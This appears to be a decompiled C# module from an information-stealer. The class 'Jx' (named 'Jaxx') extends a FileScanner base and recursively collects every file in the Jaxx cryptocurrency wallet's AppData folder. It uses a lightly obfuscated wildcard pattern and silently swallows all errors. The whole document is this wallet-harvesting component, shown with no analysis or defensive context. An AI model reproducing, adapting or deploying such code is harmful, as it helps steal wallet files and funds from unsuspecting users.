using System;
using System.Collections.Generic;
using System.IO;

// Token: 0x02000028 RID: 40
public class Jx : FileScanner
{
	// Token: 0x060000D2 RID: 210 RVA: 0x00003913 File Offset: 0x00001B13
	public Jx()
	{
		base.Name = "Jaxx";
	}

	// Token: 0x060000D3 RID: 211 RVA: 0x00003779 File Offset: 0x00001979
	public override string GetFolder(FileScannerArg scannerArg, FileInfo filePath)
	{
		return filePath.Directory.FullName.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\", string.Empty);
	}

	// Token: 0x060000D4 RID: 212 RVA: 0x00008DF8 File Offset: 0x00006FF8
	public override IEnumerable<FileScannerArg> GetScanArgs()
	{
		List<FileScannerArg> list = new List<FileScannerArg>();
		try
		{
			string directory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\com.liberty.jaxx";
			list.Add(new FileScannerArg
			{
				Directory = directory,
				Pattern = new string(new char[]
				{
					'*'
				}),
				Recoursive = true
			});
		}
		catch
		{
		}
		return list;
	}
}
